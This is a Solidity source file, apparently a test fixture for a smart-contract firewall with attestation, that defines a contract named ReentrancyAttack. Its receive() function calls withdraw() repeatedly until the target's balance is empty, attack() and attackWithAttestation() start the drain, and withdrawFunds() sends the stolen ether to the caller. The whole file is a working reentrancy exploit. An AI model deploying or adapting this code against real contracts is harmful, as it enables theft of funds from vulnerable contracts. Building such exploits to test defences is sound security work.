// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancyVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

struct Attestation {
    /// @notice Deadline UNIX timestamp
    uint256 deadline;
    /**
     * @notice Ordered hashes which should be produced at every checkpoint execution
     * in this contract. An attester uses these hashes to enable a specific execution
     * path.
     */
    bytes32[] executionHashes;
}

interface IFirewall {
        function attestedCall(Attestation calldata attestation, bytes calldata attestationSignature, bytes calldata data) external;
}

contract ReentrancyAttack {
    address public vulnerableContract;

    error WithdrawFundsFailed(address recipient);

    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    receive() external payable {
        while (vulnerableContract.balance > 0) {
            IReentrancyVulnerable(vulnerableContract).withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        IReentrancyVulnerable(vulnerableContract).deposit{value: 1 ether}();
        IReentrancyVulnerable(vulnerableContract).withdraw();
    }

    function attackWithAttestation(Attestation calldata attestation, bytes calldata attestationSignature) public payable {
        require(msg.value >= 1 ether);
        IReentrancyVulnerable(vulnerableContract).deposit{value: 1 ether}();
        bytes memory data = abi.encodeWithSelector(IReentrancyVulnerable.withdraw.selector);
        IFirewall(vulnerableContract).attestedCall(attestation, attestationSignature, data);
    }

    function withdrawFunds() public {
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        if (!success) revert WithdrawFundsFailed(msg.sender);
    }
}